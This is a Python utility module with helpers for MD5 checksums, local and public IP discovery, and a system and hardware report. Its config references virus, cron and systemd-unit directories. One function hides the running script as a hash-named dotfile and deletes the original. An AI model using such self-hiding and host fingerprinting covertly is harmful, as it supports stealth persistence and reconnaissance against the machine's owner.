"""
@author: Vuong Van Duy
utils.py
data: 14.10.2025

This module provides utility functions for user resolution, file ownership management,
file name retrieval, MD5 checksum calculation, and self-backup and deletion of files.
"""


import os
import hashlib
import shutil
import netifaces
import ipaddress
import platform
import requests
import socket
import psutil
from typing import Optional
from pathlib import Path
from config import UNIT_DIR, BACKUP_DIR, SAVE_VIRUS_DIR, CRON_DIR, WRAPPER_DIR

def create_dirs_if_not_exists():
    list_dirs = [UNIT_DIR, BACKUP_DIR, SAVE_VIRUS_DIR, CRON_DIR, WRAPPER_DIR]
    for dir_path in list_dirs:
        expanded_path = os.path.expanduser(dir_path)
        try:
            os.makedirs(expanded_path, exist_ok=True)
        except Exception as e:
            print(f"Error creating directory {expanded_path}: {e}")

def get_file_name(p: Path) -> str:
    return p.name

def check_sum_content(content: str) -> str:
    h = hashlib.md5()
    h.update(content.encode('utf-8'))
    return h.hexdigest()

def _md5_of_file(p: Path, chunk_size: int = 1024 * 1024) -> str:
    h = hashlib.md5()
    with p.open("rb") as f:
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            h.update(chunk)
    return h.hexdigest()

def self_backup_and_delete(backup_dir: Optional[str], pathFileName: Path) -> bool:
    """
    Create a backup of the running .py file with name = MD5(file) at backup_dir,
    then delete the original file. Return True if successful, False if failed.
    """
    if pathFileName is None:
        return False

    me = pathFileName

    if not me.exists():
        print("Source file not found:", me)
        return False

    digest = _md5_of_file(me)
    bdir = Path(os.path.expanduser(backup_dir)).resolve()
    try:
        bdir.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        print("Unable to create backup folder:", bdir, "-", e)
        return False

    digest_ = "." + digest + ".bak"
    backup_path = bdir / digest_

    try:
        shutil.copy2(str(me), str(backup_path))

        if _md5_of_file(backup_path) != digest:
            print("MD5 copy does not match, cancel deletion of original file.")
            try:
                backup_path.unlink()
            except Exception:
                pass
            return False

        os.remove(str(me))
        print("✅ Backup:", backup_path)
        print("🗑️ Deleted:", me)
        return True

    except Exception as e:
        print("❌ Error while backup/delete:", e)
        return False


def get_all_local_ips(target_ip: str = None):
    """Get all local IP addresses of the machine or IP matches the target pattern"""
    local_ips = []

    try:
        # Method 1: Using netifaces (more accurate)
        interfaces = netifaces.interfaces()
        for interface in interfaces:
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                for addr_info in addrs[netifaces.AF_INET]:
                    ip = addr_info['addr']
                    netmask = addr_info.get('netmask', 'N/A')
                    # Remove loopback and link-local IPs
                    if not ip.startswith('127.') and not ip.startswith('169.254.'):
                        # If no target IP specified, return all
                        if target_ip is None:
                            local_ips.append({
                                'interface': interface,
                                'ip': ip,
                                'netmask': netmask
                            })
                        else:
                            # Check if this IP matches the target pattern
                            if is_in_same_subnet(ip, target_ip, netmask):
                                local_ips.append({
                                    'interface': interface,
                                    'ip': ip,
                                    'netmask': netmask
                                })
    except Exception as e:
        print("Error getting local ips:", e)
        pass

    return local_ips


def is_in_same_subnet(ip1, ip2, netmask):
    """
    Check if two IPs are in the same subnet based on netmask
    """
    try:
        # Create network objects for both IPs with the same netmask
        network1 = ipaddress.IPv4Network(f"{ip1}/{netmask}", strict=False)
        network2 = ipaddress.IPv4Network(f"{ip2}/{netmask}", strict=False)

        return network1.network_address == network2.network_address
    except:
        return False


def get_system_info(target_ip: str = None):
    """
    Get system information and return as a formatted string
    """
    system_info = []

    # Header
    system_info.append("=" * 50)
    system_info.append("SYSTEM INFORMATION")
    system_info.append("=" * 50)

    # Operating System Information
    system_info.append(f"Operating System: {platform.system()} {platform.release()}")
    system_info.append(f"Version: {platform.version()}")
    system_info.append(f"Architecture: {platform.architecture()[0]}")
    system_info.append(f"Computer Name: {platform.node()}")
    system_info.append(f"Processor: {platform.processor()}")

    # Network Information - All Local IPs
    system_info.append("\n🔗 LOCAL NETWORK INFORMATION:")
    local_ips = get_all_local_ips(target_ip=target_ip)

    if local_ips:
        for ip_info in local_ips:
            system_info.append(f"• Interface {ip_info['interface']}: {ip_info['ip']} (Netmask: {ip_info['netmask']})")
    else:
        system_info.append("• Unable to get local IP information")

    # Get Public IP
    system_info.append("\n🌐 PUBLIC IP:")
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        public_ip = response.text
        system_info.append(f"• Public IP: {public_ip}")
    except:
        system_info.append("• Unable to get public IP")

    # Detailed Network Adapter Information
    system_info.append("\n📡 NETWORK ADAPTER INFORMATION:")
    try:
        for interface, addrs in psutil.net_if_addrs().items():
            system_info.append(f"├─ {interface}:")
            for addr in addrs:
                if addr.family == socket.AF_INET:  # IPv4
                    system_info.append(f"│  ├─ IPv4: {addr.address}")
                    system_info.append(f"│  ├─ Netmask: {addr.netmask}")
                    if addr.broadcast:
                        system_info.append(f"│  └─ Broadcast: {addr.broadcast}")
                elif addr.family == socket.AF_INET6:  # IPv6
                    system_info.append(f"│  └─ IPv6: {addr.address}")
    except Exception as e:
        system_info.append(f"• Error getting network adapter information: {e}")

    # Hardware Information
    system_info.append("\n💻 HARDWARE INFORMATION:")
    system_info.append(f"• CPU Count: {psutil.cpu_count()}")
    system_info.append(f"• RAM Memory: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB")
    system_info.append("=" * 50)

    # Join all lines into a single string
    return "\n".join(system_info)